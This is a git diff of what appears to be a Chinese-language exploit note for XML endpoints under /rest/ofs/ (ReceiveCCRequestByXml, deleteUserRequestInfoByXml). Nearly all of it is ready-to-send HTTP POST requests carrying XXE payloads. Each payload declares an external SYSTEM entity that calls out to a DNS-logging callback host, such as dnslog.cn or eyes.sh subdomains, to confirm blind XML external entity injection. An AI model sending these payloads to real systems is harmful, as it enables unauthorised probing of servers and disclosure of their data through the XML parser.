@@ -6,13 +6,8 @@
 POST /rest/ofs/deleteUserRequestInfoByXml HTTP/1.1
 Host: 
 Content-Type: application/xml
-Content-Length: 53
 
-<M>
-    <syscode>
-        666
-    </syscode>
-</M>
+<M><syscode>666</syscode></M>
 ```
 
 利用
@@ -22,21 +17,19 @@ Content-Length: 53
 POST /rest/ofs/ReceiveCCRequestByXml HTTP/1.1
 Host: 
 Content-Type: application/xml
-Content-Length: 53
 
 <?xml version="1.0" encoding="utf-8"?>
-<!DOCTYPE data SYSTEM "http://xxxx.dnslog.cn/3.xml">
-<data>&send;</data>
+<!DOCTYPE syscode SYSTEM "http://dns1.1.eyes.sh">
+<M><syscode>&send;</syscode></M>
 ```
 
 接口二:
 ```
-POST /rest/ofs/ReceiveCCRequestByXml HTTP/1.1
+POST /rest/ofs/deleteUserRequestInfoByXml HTTP/1.1
 Host: 
 Content-Type: application/xml
-Content-Length: 53
 
 <?xml version="1.0" encoding="utf-8"?>
-<!DOCTYPE data SYSTEM "http://xxxx.dnslog.cn/3.xml">
-<data>&send;</data>
+<!DOCTYPE syscode SYSTEM "http://dns2.1.eyes.sh">
+<M><syscode>&send;</syscode></M>
 ```
